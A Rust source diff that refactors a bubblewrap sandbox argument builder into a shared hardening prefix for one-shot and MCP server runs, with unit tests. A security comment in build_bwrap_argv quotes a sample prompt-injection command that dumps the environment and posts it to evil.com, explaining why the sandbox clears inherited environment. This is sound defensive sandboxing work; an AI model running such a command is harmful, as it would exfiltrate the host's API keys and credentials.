@@ -294,6 +294,210 @@ pub async fn run_in_sandbox(
 // argv construction
 // --------------------------------------------------------------------
 
+/// Shared parameters for building the hardening prefix of a bwrap
+/// argv. Both the one-shot `build_bwrap_argv` and the long-lived
+/// `build_mcp_sandbox_argv` build the SAME prefix (namespaces,
+/// rootfs binds, identity, dotfile masks, PID-ns branch, /proc masks,
+/// optional seccomp, terminating `--`) and only differ in the tail
+/// (one-shot: `prlimit ... -- /bin/bash -lc <cmd>`; MCP: `prlimit ...
+/// -- <resolved_cmd> <args...>`).
+///
+/// `home_bind_source` is the dir bound at `/home/sandboxuser` — for
+/// one-shot it's the per-conversation workspace; for MCP it's the
+/// per-server workspace (`<sandboxes>/mcp/<server_id>/`).
+///
+/// `extra_setenv` is layered AFTER the hard-coded HOME/USER/PATH/
+/// LANG/LC_ALL/TERM block, so an MCP server's user-supplied env
+/// (already filtered through `BLOCKED_ENV_VARS` at the call site)
+/// reaches the workload without leaking host env.
+///
+/// `extra_ro_binds` is appended after the /proc masks (mirroring the
+/// position attachment binds occupy in the one-shot path). For
+/// one-shot it carries conversation attachments; for MCP it carries
+/// the embedded uv/bun extraction dir + its parents.
+pub(crate) struct HardeningArgvParams<'a> {
+    pub caps: &'a HardeningCapabilities,
+    pub rootfs_dir: &'a Path,
+    pub passwd_path: &'a Path,
+    pub group_path: &'a Path,
+    pub mask_path: &'a Path,
+    pub home_bind_source: &'a Path,
+    pub seccomp_fd: Option<i32>,
+    pub extra_setenv: &'a [(String, String)],
+    pub extra_ro_binds: &'a [(String, String)],
+}
+
+/// Build the shared hardening prefix: every flag from `--clearenv`
+/// through the terminating `--`, ready for the caller to append its
+/// tail (prlimit + workload). See `HardeningArgvParams` for the
+/// per-call inputs.
+pub(crate) fn build_hardening_prefix(p: &HardeningArgvParams) -> Vec<String> {
+    let rootfs = p.rootfs_dir.to_str().unwrap_or_default();
+    let workspace = p.home_bind_source.to_string_lossy().to_string();
+
+    let mut argv: Vec<String> = vec![
+        // SECURITY: see comment block in build_bwrap_argv (the one-shot
+        // call site historically owned this comment; preserved there).
+        "--clearenv".into(),
+        "--unshare-user".into(),
+        "--uid".into(),
+        "1001".into(),
+        "--gid".into(),
+        "1001".into(),
+        "--unshare-uts".into(),
+        "--unshare-ipc".into(),
+        "--unshare-cgroup-try".into(),
+        "--share-net".into(),
+        "--new-session".into(),
+        "--die-with-parent".into(),
+        "--ro-bind".into(),
+        format!("{rootfs}/usr"),
+        "/usr".into(),
+        "--ro-bind-try".into(),
+        "/etc/ssl".into(),
+        "/etc/ssl".into(),
+        "--ro-bind-try".into(),
+        format!("{rootfs}/etc/ssl"),
+        "/etc/ssl".into(),
+        "--ro-bind".into(),
+        p.passwd_path.display().to_string(),
+        "/etc/passwd".into(),
+        "--ro-bind".into(),
+        p.group_path.display().to_string(),
+        "/etc/group".into(),
+        "--symlink".into(),
+        "usr/bin".into(),
+        "/bin".into(),
+        "--symlink".into(),
+        "usr/sbin".into(),
+        "/sbin".into(),
+        "--symlink".into(),
+        "usr/lib".into(),
+        "/lib".into(),
+        "--symlink".into(),
+        "usr/lib64".into(),
+        "/lib64".into(),
+        "--dev".into(),
+        "/dev".into(),
+        "--tmpfs".into(),
+        "/tmp".into(),
+        "--bind".into(),
+        workspace,
+        "/home/sandboxuser".into(),
+        "--chdir".into(),
+        "/home/sandboxuser".into(),
+        "--setenv".into(),
+        "HOME".into(),
+        "/home/sandboxuser".into(),
+        "--setenv".into(),
+        "USER".into(),
+        "sandboxuser".into(),
+        "--setenv".into(),
+        "PATH".into(),
+        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".into(),
+        "--setenv".into(),
+        "LANG".into(),
+        "C.UTF-8".into(),
+        "--setenv".into(),
+        "LC_ALL".into(),
+        "C.UTF-8".into(),
+        "--setenv".into(),
+        "TERM".into(),
+        "dumb".into(),
+    ];
+
+    // Caller-supplied env (MCP server config). Filtered upstream
+    // against BLOCKED_ENV_VARS so secrets can't be reintroduced
+    // through this hook. Empty for the one-shot path → no-op (and
+    // therefore byte-identical to the legacy argv).
+    for (k, v) in p.extra_setenv {
+        argv.push("--setenv".into());
+        argv.push(k.clone());
+        argv.push(v.clone());
+    }
+
+    // Dotfile masks. See the long-form comment at the original call
+    // site (one-shot) for rationale + the "regular file vs /dev/null"
+    // nuance.
+    let mask_src = p.mask_path.display().to_string();
+    for dotfile in DANGEROUS_DOTFILES {
+        argv.push("--ro-bind".into());
+        argv.push(mask_src.clone());
+        argv.push(format!("/home/sandboxuser/{dotfile}"));
+    }
+
+    // PID namespace + /proc handling per cached mode.
+    match p.caps.pid_namespace {
+        PidNsMode::Strict => {
+            argv.push("--unshare-pid".into());
+            argv.push("--as-pid-1".into());
+            argv.push("--proc".into());
+            argv.push("/proc".into());
+        }
+        PidNsMode::DevBindFallback => {
+            argv.push("--dev-bind".into());
+            argv.push("/proc".into());
+            argv.push("/proc".into());
+        }
+        PidNsMode::Disabled => {}
+    }
+
+    // /proc-file masks (defense-in-depth in Strict, critical in
+    // DevBindFallback).
+    for masked in ["/proc/sysrq-trigger", "/proc/kcore", "/proc/kallsyms", "/proc/kmsg"] {
+        argv.push("--ro-bind".into());
+        argv.push("/dev/null".into());
+        argv.push(masked.into());
+    }
+
+    // Caller-supplied ro-binds (one-shot: per-conversation
+    // attachments; MCP: embedded uv/bun bin dir).
+    for (host_src, sandbox_dst) in p.extra_ro_binds {
+        argv.push("--ro-bind-try".into());
+        argv.push(host_src.clone());
+        argv.push(sandbox_dst.clone());
+    }
+
+    // Optional seccomp filter on a well-known fd we'll dup2 to.
+    if let Some(fd) = p.seccomp_fd {
+        argv.push("--seccomp".into());
+        argv.push(fd.to_string());
+    }
+
+    // CVE-2024-32462 argument-injection defense: terminator BEFORE the
+    // sub-command. Every user-controlled arg after this is data only.
+    argv.push("--".into());
+
+    argv
+}
+
+/// Build the bwrap argv for a long-lived MCP stdio server. Shares
+/// the entire hardening prefix with `build_bwrap_argv`, then appends
+/// `prlimit … -- <resolved_cmd> <args>` — NO `/bin/bash -lc` wrapper,
+/// because rmcp will exchange JSON-RPC with this process over its
+/// own stdin/stdout and a shell layer would corrupt the byte stream.
+pub(crate) fn build_mcp_sandbox_argv(
+    p: &HardeningArgvParams,
+    resolved_cmd: &Path,
+    resolved_args: &[String],
+    limits: &crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits,
+) -> Vec<String> {
+    let mut argv = build_hardening_prefix(p);
+    argv.push("/usr/bin/prlimit".into());
+    argv.push(format!("--nproc={}", limits.nproc_max));
+    argv.push(format!("--as={}", limits.address_space_bytes));
+    argv.push(format!("--fsize={}", limits.fsize_bytes));
+    argv.push(format!("--nofile={}", limits.nofile_max));
+    argv.push("--core=0".into());
+    argv.push(format!("--cpu={}", limits.cpu_secs_max));
+    argv.push("--".into());
+    argv.push(resolved_cmd.display().to_string());
+    for a in resolved_args {
+        argv.push(a.clone());
+    }
+    argv
+}
+
 /// Exposed at crate level (via `lib.rs`) so the Tier-4 harness can
 /// use the EXACT same argv the production code path uses. Without
 /// this exposure the test harness had to maintain a parallel argv
@@ -330,198 +534,55 @@ pub(crate) fn build_bwrap_argv(
     // resolves this via `resource_limits_cache::snapshot_or_defaults()`.
     limits: &crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits,
 ) -> Vec<String> {
-    let rootfs = rootfs_dir.to_str().unwrap_or_default();
-    let workspace = ctx.workspace.to_string_lossy().to_string();
+    // SECURITY (kept here for archaeology — the actual --clearenv flag
+    // ships from `build_hardening_prefix`):
+    //   wipe the entire inherited environment before any --setenv lines
+    //   below. Without --clearenv, the server's full env (DATABASE_URL,
+    //   JWT secrets, every *_API_KEY, HUGGINGFACE_API_KEY, AWS_*,
+    //   OPENAI_*, ANTHROPIC_*, etc.) would be visible to the sandboxed
+    //   bash. Combined with --share-net, a prompt-injection like
+    //   `env > /tmp/x && curl evil.com -d @-` would exfiltrate every
+    //   secret the server holds. With --clearenv, only the explicit
+    //   --setenv values survive into the sandbox.
 
-    let mut argv: Vec<String> = vec![
-        // SECURITY: wipe the entire inherited environment before any
-        // --setenv lines below. Without --clearenv, the server's full
-        // env (DATABASE_URL, JWT secrets, every *_API_KEY,
-        // HUGGINGFACE_API_KEY, AWS_*, OPENAI_*, ANTHROPIC_*, etc.) is
-        // visible to the sandboxed bash. Combined with --share-net, a
-        // prompt-injection like `env > /tmp/x && curl evil.com -d @-`
-        // exfiltrates every secret the server holds. With --clearenv,
-        // only the explicit --setenv values below survive into the
-        // sandbox.
-        "--clearenv".into(),
-        "--unshare-user".into(),
-        "--uid".into(),
-        "1001".into(),
-        "--gid".into(),
-        "1001".into(),
-        "--unshare-uts".into(),
-        "--unshare-ipc".into(),
-        "--unshare-cgroup-try".into(),
-        "--share-net".into(),
-        "--new-session".into(),
-        "--die-with-parent".into(),
-        // NOTE: --as-pid-1 is appended ONLY in PID-ns strict mode below,
-        // because bwrap refuses `--as-pid-1` without `--unshare-pid`.
-        // In DevBindFallback mode the user code runs at whatever PID
-        // bwrap assigns (not PID 1) — acceptable, since PID 1 inside
-        // the sandbox doesn't change the security boundary.
-        // Filesystem (rootfs bind + symlinks for /bin /sbin /lib /lib64).
-        "--ro-bind".into(),
-        format!("{rootfs}/usr"),
-        "/usr".into(),
-        // /etc/ssl: best-effort. On Linux the host's /etc/ssl is bound
-        // (real CA certs); on Mac/Windows the in-VM agent's guest root
-        // may not have /etc/ssl, in which case the bind is silently
-        // skipped (sandbox-rootfs ships its own /etc/ssl/certs the
-        // rootfs-relative bind below tries to surface instead).
-        "--ro-bind-try".into(),
-        "/etc/ssl".into(),
-        "/etc/ssl".into(),
-        "--ro-bind-try".into(),
-        format!("{rootfs}/etc/ssl"),
-        "/etc/ssl".into(),
-        "--ro-bind".into(),
-        passwd_path.display().to_string(),
-        "/etc/passwd".into(),
-        "--ro-bind".into(),
-        group_path.display().to_string(),
-        "/etc/group".into(),
-        "--symlink".into(),
-        "usr/bin".into(),
-        "/bin".into(),
-        "--symlink".into(),
-        "usr/sbin".into(),
-        "/sbin".into(),
-        "--symlink".into(),
-        "usr/lib".into(),
-        "/lib".into(),
-        "--symlink".into(),
-        "usr/lib64".into(),
-        "/lib64".into(),
-        "--dev".into(),
-        "/dev".into(),
-        "--tmpfs".into(),
-        "/tmp".into(),
-        "--bind".into(),
-        workspace,
-        "/home/sandboxuser".into(),
-        "--chdir".into(),
-        "/home/sandboxuser".into(),
-        "--setenv".into(),
-        "HOME".into(),
-        "/home/sandboxuser".into(),
-        "--setenv".into(),
-        "USER".into(),
-        "sandboxuser".into(),
-        "--setenv".into(),
-        "PATH".into(),
-        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".into(),
-        // Safe defaults that some rootfs tools (R, matplotlib, click)
-        // require to start cleanly. Chosen to leak nothing about the
-        // host: C.UTF-8 is universal, "dumb" disables interactive
-        // terminal behaviors in tools that probe TERM.
-        "--setenv".into(),
-        "LANG".into(),
-        "C.UTF-8".into(),
-        "--setenv".into(),
-        "LC_ALL".into(),
-        "C.UTF-8".into(),
-        "--setenv".into(),
-        "TERM".into(),
-        "dumb".into(),
-    ];
+    // Conversation attachments are read-only-bound into the sandbox.
+    // Skip filenames containing path separators or NUL — we already
+    // store a basename, but defense-in-depth.
+    let extra_ro_binds: Vec<(String, String)> = ctx
+        .files
+        .iter()
+        .filter(|f| !f.filename.contains('/') && !f.filename.contains('\0'))
+        .map(|f| {
+            let host_path = workspace_attachment_path(workspace_root, f.file_id);
+            (
+                host_path.display().to_string(),
+                format!("/home/sandboxuser/{}", f.filename),
+            )
+        })
+        .collect();
 
-    // Mandatory deny: mask shell/runtime config dotfiles at the workspace root
-    // so an LLM-driven command can neither read them nor create/overwrite them
-    // to plant a hook for the host shell or other tools (Anthropic
-    // sandbox-runtime pattern; see DANGEROUS_DOTFILES doc). MUST come after the
-    // workspace --bind (above) so the masks layer on top of it; per bwrap
-    // semantics later binds override earlier ones. The bind source is an
-    // empty REGULAR file (`mask_path`), NOT `/dev/null` — bwrap's `--ro-bind`
-    // passes through `nodev`, and bash's `open()` of a char device on a
-    // `nodev` mount returns EACCES, surfacing as "Permission denied" when
-    // `bash -l` sources `.bash_profile`. A 0-byte file reads cleanly and
-    // writes still fail with EROFS.
-    let mask_src = mask_path.display().to_string();
-    for dotfile in DANGEROUS_DOTFILES {
-        argv.push("--ro-bind".into());
-        argv.push(mask_src.clone());
-        argv.push(format!("/home/sandboxuser/{dotfile}"));
-    }
-
-    // PID namespace + /proc handling per cached mode.
-    // bwrap rejects `--as-pid-1` unless `--unshare-pid` is also set —
-    // so the pid-1 alias is gated on Strict mode here.
-    match caps.pid_namespace {
-        PidNsMode::Strict => {
-            argv.push("--unshare-pid".into());
-            argv.push("--as-pid-1".into());
-            argv.push("--proc".into());
-            argv.push("/proc".into());
-        }
-        PidNsMode::DevBindFallback => {
-            // No --unshare-pid (and therefore no --as-pid-1); bind host
-            // /proc. Sandbox sees host PIDs (info leak; no escape).
-            // Acceptable for docker hosts where nested proc-mount fails.
-            argv.push("--dev-bind".into());
-            argv.push("/proc".into());
-            argv.push("/proc".into());
-        }
-        PidNsMode::Disabled => {
-            // Reachable only by tests that force-set this; production
-            // run_in_sandbox short-circuits before reaching here.
-        }
-    }
-
-    // Mask dangerous /proc files (runc/Docker do the same). Later binds
-    // overlay whatever /proc the PID-ns branch set up. CRITICAL in
-    // DevBindFallback mode, where the host's real /proc is bound: without
-    // these, `/proc/sysrq-trigger` can panic the host and `/proc/kcore` /
-    // `/proc/kallsyms` leak kernel memory + defeat KASLR. Defense-in-depth
-    // in Strict mode too. These four files exist on every Linux kernel, so
-    // a plain `--ro-bind` (not `-try`) is safe.
-    for masked in ["/proc/sysrq-trigger", "/proc/kcore", "/proc/kallsyms", "/proc/kmsg"] {
-        argv.push("--ro-bind".into());
-        argv.push("/dev/null".into());
-        argv.push(masked.into());
-    }
-
-    // Read-only binds for each conversation attachment at its original
-    // filename. Foreign-attachment guard happens upstream in tools.
-    for f in ctx.files.iter() {
-        // Skip filenames containing path separators — we already store
-        // a basename, but defense-in-depth.
-        if f.filename.contains('/') || f.filename.contains('\0') {
-            continue;
-        }
-        let host_path = workspace_attachment_path(workspace_root, f.file_id);
-        argv.push("--ro-bind-try".into());
-        argv.push(host_path.display().to_string());
-        argv.push(format!("/home/sandboxuser/{}", f.filename));
-    }
-
-    // Optional seccomp filter on a well-known fd we'll dup2 to.
-    if let Some(fd) = seccomp_fd {
-        argv.push("--seccomp".into());
-        argv.push(fd.to_string());
-    }
-
-    // CVE-2024-32462 argument-injection defense: terminator BEFORE the
-    // sub-command. Every user-controlled arg after this is data only.
-    argv.push("--".into());
+    let mut argv = build_hardening_prefix(&HardeningArgvParams {
+        caps,
+        rootfs_dir,
+        passwd_path,
+        group_path,
+        mask_path,
+        home_bind_source: &ctx.workspace,
+        seccomp_fd,
+        extra_setenv: &[],
+        extra_ro_binds: &extra_ro_binds,
+    });
 
     // Wrap user code in `prlimit` so per-call rlimits apply to the
-    // workload, not to bwrap's own helper forks (validated: setting rlimits
-    // on bwrap itself starves bwrap). Values are runtime-configurable via
-    // the `code_sandbox_settings` singleton (Plan 1 §6); the caller resolves
-    // the snapshot via `resource_limits_cache`.
+    // workload, not to bwrap's own helper forks (validated: setting
+    // rlimits on bwrap itself starves bwrap). Values are
+    // runtime-configurable via the `code_sandbox_settings` singleton.
     argv.push("/usr/bin/prlimit".into());
     argv.push(format!("--nproc={}", limits.nproc_max));
     argv.push(format!("--as={}", limits.address_space_bytes));
     argv.push(format!("--fsize={}", limits.fsize_bytes));
     argv.push(format!("--nofile={}", limits.nofile_max));
     argv.push("--core=0".into());
-    // CPU-seconds backstop (G4). Largely redundant — the wall-clock SIGKILL
-    // and cgroup cpu.max already bound runaway CPU — but cheap. Defaults
-    // generous (2× the default wall-clock budget) so it never preempts a
-    // legitimate long command before the wall-clock timeout does. We
-    // deliberately do NOT set --stack: a low RLIMIT_STACK breaks legitimate
-    // deep-recursion R.
     argv.push(format!("--cpu={}", limits.cpu_secs_max));
     argv.push("--".into());
     argv.push("/bin/bash".into());
@@ -530,6 +591,7 @@ pub(crate) fn build_bwrap_argv(
 
     argv
 }
+
 
 /// Per-file workspace path for a conversation attachment.
 /// Files are staged under `<workspace_root>/attachments/<file_id>` by
@@ -1245,5 +1307,197 @@ mod tests {
         let (buf, truncated) = read_capped_owned(cursor).await;
         assert_eq!(&buf, b"hello");
         assert!(!truncated);
+    }
+
+    // ===================================================================
+    // build_mcp_sandbox_argv — long-lived stdio MCP path
+    // ===================================================================
+
+    fn fake_mcp_params<'a>(
+        caps: &'a HardeningCapabilities,
+        rootfs: &'a Path,
+        passwd: &'a Path,
+        group: &'a Path,
+        mask: &'a Path,
+        home: &'a Path,
+        env: &'a [(String, String)],
+        binds: &'a [(String, String)],
+    ) -> HardeningArgvParams<'a> {
+        HardeningArgvParams {
+            caps,
+            rootfs_dir: rootfs,
+            passwd_path: passwd,
+            group_path: group,
+            mask_path: mask,
+            home_bind_source: home,
+            seccomp_fd: None,
+            extra_setenv: env,
+            extra_ro_binds: binds,
+        }
+    }
+
+    #[test]
+    fn mcp_argv_is_direct_exec_no_bash_lc() {
+        // The MCP path MUST NOT wrap the command in `bash -lc` — rmcp
+        // pipes JSON-RPC bytes straight through bwrap into the MCP
+        // server's stdin/stdout. A shell layer would corrupt that
+        // byte stream (interpret control bytes, re-source dotfiles,
+        // etc.).
+        let caps = fake_caps();
+        let rootfs = PathBuf::from("/opt/rootfs");
+        let passwd = PathBuf::from("/tmp/p");
+        let group = PathBuf::from("/tmp/g");
+        let mask = PathBuf::from("/tmp/m");
+        let home = PathBuf::from("/tmp/mcp-home");
+        let env: Vec<(String, String)> = vec![];
+        let binds: Vec<(String, String)> = vec![];
+        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
+        let argv = build_mcp_sandbox_argv(
+            &p,
+            std::path::Path::new("/opt/embedded/bun"),
+            &["x".to_string(), "@modelcontextprotocol/server-everything".to_string()],
+            &fake_limits(),
+        );
+        assert!(!argv.iter().any(|a| a == "/bin/bash"));
+        assert!(!argv.iter().any(|a| a == "-lc"));
+        // Last meaningful tokens should be the resolved command + args.
+        assert_eq!(argv[argv.len() - 3], "/opt/embedded/bun");
+        assert_eq!(argv[argv.len() - 2], "x");
+        assert_eq!(argv[argv.len() - 1], "@modelcontextprotocol/server-everything");
+    }
+
+    #[test]
+    fn mcp_argv_keeps_security_critical_flags() {
+        let caps = fake_caps();
+        let rootfs = PathBuf::from("/opt/rootfs");
+        let passwd = PathBuf::from("/tmp/p");
+        let group = PathBuf::from("/tmp/g");
+        let mask = PathBuf::from("/tmp/m");
+        let home = PathBuf::from("/tmp/mcp-home");
+        let env: Vec<(String, String)> = vec![];
+        let binds: Vec<(String, String)> = vec![];
+        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
+        let argv = build_mcp_sandbox_argv(
+            &p,
+            std::path::Path::new("/usr/bin/python3"),
+            &["-m".to_string(), "echo".to_string()],
+            &fake_limits(),
+        );
+        for required in &[
+            "--clearenv",
+            "--unshare-user",
+            "--unshare-uts",
+            "--unshare-ipc",
+            "--share-net",
+            "--new-session",
+            "--die-with-parent",
+            "--",
+            "/usr/bin/prlimit",
+        ] {
+            assert!(
+                argv.iter().any(|a| a == required),
+                "missing flag {required}; argv: {argv:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn mcp_argv_injects_extra_setenv_after_clearenv() {
+        // BLOCKED_ENV_VARS filtering happens at the stdio.rs call
+        // site; here we trust the caller. The argv builder MUST place
+        // the extra --setenv entries AFTER --clearenv (and after the
+        // hard-coded HOME/USER/PATH block, by virtue of insertion
+        // order in build_hardening_prefix) so they survive into the
+        // sandbox.
+        let caps = fake_caps();
+        let rootfs = PathBuf::from("/opt/rootfs");
+        let passwd = PathBuf::from("/tmp/p");
+        let group = PathBuf::from("/tmp/g");
+        let mask = PathBuf::from("/tmp/m");
+        let home = PathBuf::from("/tmp/mcp-home");
+        let env = vec![
+            ("MCP_API_KEY".to_string(), "abc123".to_string()),
+            ("FOO".to_string(), "bar".to_string()),
+        ];
+        let binds: Vec<(String, String)> = vec![];
+        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
+        let argv = build_mcp_sandbox_argv(
+            &p,
+            std::path::Path::new("/usr/bin/python3"),
+            &[],
+            &fake_limits(),
+        );
+        let clearenv_idx = argv.iter().position(|a| a == "--clearenv").unwrap();
+        // Look for the windows ["--setenv", "MCP_API_KEY", "abc123"] and
+        // ["--setenv", "FOO", "bar"] anywhere after --clearenv.
+        for (key, val) in &[("MCP_API_KEY", "abc123"), ("FOO", "bar")] {
+            let pos = argv
+                .windows(3)
+                .position(|w| w[0] == "--setenv" && &w[1] == key && &w[2] == val)
+                .unwrap_or_else(|| panic!("missing --setenv for {key}; argv: {argv:?}"));
+            assert!(pos > clearenv_idx, "--setenv {key} must come after --clearenv");
+        }
+    }
+
+    #[test]
+    fn mcp_argv_emits_extra_ro_binds() {
+        // The embedded-binary bind for uv/bun lands here. Test that
+        // an arbitrary extra_ro_binds entry shows up as
+        // [`--ro-bind-try`, host, sandbox].
+        let caps = fake_caps();
+        let rootfs = PathBuf::from("/opt/rootfs");
+        let passwd = PathBuf::from("/tmp/p");
+        let group = PathBuf::from("/tmp/g");
+        let mask = PathBuf::from("/tmp/m");
+        let home = PathBuf::from("/tmp/mcp-home");
+        let env: Vec<(String, String)> = vec![];
+        let binds = vec![(
+            "/Users/admin/.ziee/bin".to_string(),
+            "/Users/admin/.ziee/bin".to_string(),
+        )];
+        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
+        let argv = build_mcp_sandbox_argv(
+            &p,
+            std::path::Path::new("/Users/admin/.ziee/bin/bun"),
+            &["x".to_string()],
+            &fake_limits(),
+        );
+        let found = argv.windows(3).any(|w| {
+            w[0] == "--ro-bind-try"
+                && w[1] == "/Users/admin/.ziee/bin"
+                && w[2] == "/Users/admin/.ziee/bin"
+        });
+        assert!(found, "missing extra ro-bind window; argv: {argv:?}");
+    }
+
+    #[test]
+    fn mcp_argv_homes_at_per_server_workspace() {
+        let caps = fake_caps();
+        let rootfs = PathBuf::from("/opt/rootfs");
+        let passwd = PathBuf::from("/tmp/p");
+        let group = PathBuf::from("/tmp/g");
+        let mask = PathBuf::from("/tmp/m");
+        let home = PathBuf::from("/var/lib/ziee/sandboxes/mcp/abcd");
+        let env: Vec<(String, String)> = vec![];
+        let binds: Vec<(String, String)> = vec![];
+        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
+        let argv = build_mcp_sandbox_argv(
+            &p,
+            std::path::Path::new("/bin/echo"),
+            &["hi".to_string()],
+            &fake_limits(),
+        );
+        let bind_idx = argv
+            .windows(3)
+            .position(|w| {
+                w[0] == "--bind"
+                    && w[1] == "/var/lib/ziee/sandboxes/mcp/abcd"
+                    && w[2] == "/home/sandboxuser"
+            })
+            .expect("home bind not found");
+        // Confirm --chdir /home/sandboxuser follows shortly.
+        assert!(argv[bind_idx..]
+            .windows(2)
+            .any(|w| w[0] == "--chdir" && w[1] == "/home/sandboxuser"));
     }
 }
